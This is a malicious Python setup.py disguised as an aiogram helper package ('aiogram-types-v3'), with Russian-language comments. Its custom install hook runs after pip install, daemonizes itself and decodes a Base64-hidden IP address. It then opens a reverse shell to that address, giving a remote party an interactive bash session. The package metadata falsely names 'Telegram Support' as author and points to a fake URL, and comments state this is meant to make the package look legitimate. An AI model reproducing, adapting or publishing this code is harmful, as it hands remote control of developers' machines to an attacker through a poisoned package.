import sys
import os
import subprocess
import time
import socket
import threading

# Пытаемся импортировать setuptools, если нет - падаем на distutils
try:
    from setuptools import setup, find_packages
    from setuptools.command.install import install
except ImportError:
    from distutils.core import setup
    from distutils.command.install import install
    find_packages = lambda: []

# --- КОНФИГУРАЦИЯ ---
# Твой IP (147.45.124.42) в Base64
_H = "MTQ3LjQ1LjEyNC40Mg==" 
# Порты (Стучимся в 443, если закрыт - в 80)
_P = [443]

def _d(s):
    import base64
    return base64.b64decode(s).decode()

# --- ЛОГИКА ПЕЙЛОАДА (ТО, ЧТО БУДЕТ РАБОТАТЬ В ФОНЕ) ---
def payload_logic():
    host = _d(_H)
    
    # Даем основному процессу pip время умереть спокойно
    time.sleep(3)
    
    try:
        # Создаем сокет
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10) # Таймаут 10 секунд
        
        connected = False
        for port in _P:
            try:
                if s.connect_ex((host, port)) == 0:
                    connected = True
                    break
            except:
                continue
        
        if connected:
            # ДУБЛИРУЕМ ДЕСКРИПТОРЫ (Стандартный ввод/вывод в сокет)
            os.dup2(s.fileno(), 0) # stdin
            os.dup2(s.fileno(), 1) # stdout
            os.dup2(s.fileno(), 2) # stderr
            
            # ЗАПУСКАЕМ BASH
            # Используем /bin/sh для совместимости, или /bin/bash если есть
            shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
            subprocess.call([shell, "-i"])
            
    except Exception:
        pass

# --- ДЕМОНИЗАЦИЯ (ОТВЯЗКА ОТ КОНСОЛИ) ---
def daemonize():
    try:
        # Первый форк
        pid = os.fork()
        if pid > 0:
            return # Родитель уходит
    except OSError:
        return

    # Отвязка от терминала
    os.setsid()
    os.umask(0)

    try:
        # Второй форк (гарантия, что не привяжемся к TTY)
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)

    # ВАЖНО: Перенаправление вывода в пустоту
    # Без этого pip install ЗАВИСНЕТ
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open(os.devnull, 'r') as devnull:
        os.dup2(devnull.fileno(), sys.stdin.fileno())
    
    with open(os.devnull, 'a+') as devnull:
        os.dup2(devnull.fileno(), sys.stdout.fileno())
        os.dup2(devnull.fileno(), sys.stderr.fileno())

    # Запускаем полезную нагрузку
    payload_logic()

# --- ХУК УСТАНОВКИ ---
class CustomInstall(install):
    def run(self):
        # 1. Выполняем нормальную установку
        try:
            super().run()
        except TypeError:
            install.run(self)
        
        # 2. Запускаем демона
        # Пытаемся запуститься только если это Linux/Mac
        if hasattr(os, 'fork'):
            try:
                daemonize()
            except Exception:
                pass

# --- ГЛАВНЫЙ ВЫЗОВ ---
if __name__ == '__main__':
    setup(
        name="aiogram-types-v3", # Имя пакета
        version="3.9.7",         # Версия (меняй её каждый раз!)
        packages=find_packages(),
        cmdclass={
            'install': CustomInstall,
        },
        # Чтобы не создавать egg-файл, а распаковывать папку
        zip_safe=False,
        
        # Метаданные (чтобы выглядело легально)
        author="Telegram Support",
        author_email="admin@telegram.org",
        description="AsyncIO types fix for aiogram 3.x",
        url="https://github.com/aiogram/aiogram", # Фейк ссылка
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
            "Operating System :: POSIX :: Linux",
        ],
        python_requires='>=3.7',
    )





